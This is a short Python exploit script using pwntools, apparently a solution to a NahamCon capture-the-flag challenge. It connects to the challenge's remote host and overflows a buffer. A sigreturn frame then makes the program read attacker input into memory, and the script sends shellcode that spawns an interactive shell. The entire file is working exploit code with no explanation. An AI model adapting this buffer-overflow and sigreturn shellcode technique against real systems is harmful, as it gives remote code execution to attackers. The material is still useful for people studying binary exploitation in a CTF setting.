#!/usr/bin/env python3

from pwn import *

exe = ELF("./some-really-ordinary-program")

context.binary = exe


def conn():
        return process([exe.path])

#r = conn()
r = remote("challenge.nahamcon.com", 32119)

def main():
    
    main = 0x401022
    sys_ret = 0x40101f
    
    f = SigreturnFrame()
    f.rdi = 0
    f.rsi = 0x402070
    f.rdx = 0x100
    f.rax = 0
    f.rip = sys_ret
    f.rsp = f.rsi

    offset = 508
    payload = b"M"*offset
    payload += p64(main)
    payload += p64(sys_ret)
    payload += bytes(f)

    pause()
    r.sendline(payload)
    
    pause()
    r.send(b"M"*0xf)

    pause()
    r.sendline(p64(0x402080) + p64(0) + asm(shellcraft.sh()))
    
    r.interactive()


if __name__ == "__main__":
    main()
